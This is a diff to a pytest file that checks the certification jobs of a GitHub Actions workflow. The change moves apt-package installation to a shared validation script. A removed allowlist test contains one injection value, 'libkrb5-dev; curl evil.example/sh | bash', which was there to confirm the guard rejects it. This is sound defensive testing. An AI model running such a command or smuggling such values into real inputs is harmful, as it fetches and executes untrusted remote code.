@@ -10,13 +10,13 @@ fault rather than the app's:
   failed. Both certify jobs now set ``UV_PYTHON`` from
   ``container_python_version.py print-version`` before any install.
 * **System packages.** Native sdists (hive's pykerberos) need headers the
-  runner lacks; ``apt_packages`` installs them, with the same allowlist guard
-  as tests-reusable.yaml.
+  runner lacks; ``apt_packages`` installs them through
+  ``install_apt_packages.py``, the script every reusable's package input goes
+  through (its behaviour is tested in test_install_apt_packages.py).
 
 The step order and env routing are asserted as YAML shape (the protected
-behaviour is GitHub Actions' own). The pin script and the apt guard are
-EXECUTED, lifted from the workflow, so a test cannot pass while the workflow
-drifts.
+behaviour is GitHub Actions' own). The pin script is EXECUTED, lifted from the
+workflow, so a test cannot pass while the workflow drifts.
 """
 
 from __future__ import annotations
@@ -40,7 +40,6 @@ Step = dict[str, Any]
 
 REPO_ROOT = Path(__file__).resolve().parents[3]
 WORKFLOW = REPO_ROOT / ".github" / "workflows" / "build-and-publish-app.yaml"
-TESTS_REUSABLE = REPO_ROOT / ".github" / "workflows" / "tests-reusable.yaml"
 
 CERTIFY_JOBS = ["certify", "certify-unit"]
 PIN_STEP = "Pin Python to the app image's version"
@@ -51,11 +50,6 @@ INSTALL_STEP = "Install app dependencies"
 @pytest.fixture(scope="module")
 def workflow() -> Workflow:
     return yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
-
-
-@pytest.fixture(scope="module")
-def tests_workflow() -> Workflow:
-    return yaml.safe_load(TESTS_REUSABLE.read_text(encoding="utf-8"))
 
 
 def _steps(workflow: Workflow, job: str) -> list[Step]:
@@ -205,56 +199,29 @@ def test_apt_step_routes_the_value_through_env(workflow: Workflow, job: str) -> 
 
 
 @pytest.mark.parametrize("job", CERTIFY_JOBS)
-def test_apt_step_is_byte_identical_to_tests_reusable(
-    workflow: Workflow,
-    tests_workflow: Workflow,
-    job: str,
+def test_apt_step_installs_through_the_shared_script(
+    workflow: Workflow, job: str
 ) -> None:
-    """One guard, now in four places: pin these copies to tests-reusable's so
-    a fix to one that misses the others fails here."""
-    reference = next(
-        step
-        for step in tests_workflow["jobs"]["unit"]["steps"]
-        if step.get("name") == "Install system packages (apt-packages)"
+    """The step only hands the value to install_apt_packages.py, read from the
+    SDK checkout that precedes it, so the package-name check cannot drift from
+    the other reusables' (FND-4908)."""
+    steps = _steps(workflow, job)
+    apt = _index(steps, APT_STEP)
+    assert steps[apt]["run"].strip() == (
+        "python3 sdk/.github/scripts/install_apt_packages.py --env APT_PACKAGES"
     )
-    step = _steps(workflow, job)[_index(_steps(workflow, job), APT_STEP)]
-    assert step["run"] == reference["run"]
-
-
-def _guard(script: str) -> str:
-    lines = script.splitlines()
-    start = next(i for i, line in enumerate(lines) if line.strip().startswith("printf"))
-    end = start
-    while lines[end].rstrip().endswith("\\"):
-        end += 1
-    return " ".join(line.strip().rstrip("\\") for line in lines[start : end + 1])
-
-
-@pytest.mark.parametrize(
-    ("value", "accepted"),
-    [
-        ("libkrb5-dev gcc python3-dev", True),  # hive's tests-reusable list
-        ("libkrb5-dev", True),
-        ("libkrb5-dev; curl evil.example/sh | bash", False),
-        ("-y", False),
-        ("lib*", False),
-        ("", False),
-    ],
-)
-def test_apt_guard_executes_as_an_allowlist(
-    workflow: Workflow,
-    value: str,
-    accepted: bool,
-) -> None:
-    step = _steps(workflow, "certify")[_index(_steps(workflow, "certify"), APT_STEP)]
-    proc = subprocess.run(
-        ["bash", "-c", f"set -euo pipefail\n{_guard(step['run'])}\n"],
-        capture_output=True,
-        text=True,
-        timeout=30,
-        env={"PATH": os.environ.get("PATH", ""), "APT_PACKAGES": value},
+    withs: list[dict[str, Any]] = [step.get("with") or {} for step in steps]
+    sdk = next(
+        i
+        for i, with_ in enumerate(withs)
+        if with_.get("repository") == "atlanhq/application-sdk"
+        and with_.get("path") == "sdk"
     )
-    assert (proc.returncode == 0) is accepted, proc.stderr
+    assert sdk < apt, "the SDK checkout must land before the script runs"
+    sparse = str(withs[sdk].get("sparse-checkout", ""))
+    assert not sparse or ".github/scripts" in sparse.split(), (
+        "the SDK checkout must include .github/scripts"
+    )
 
 
 def _step_with_id(steps: list[Step], step_id: str) -> Step:
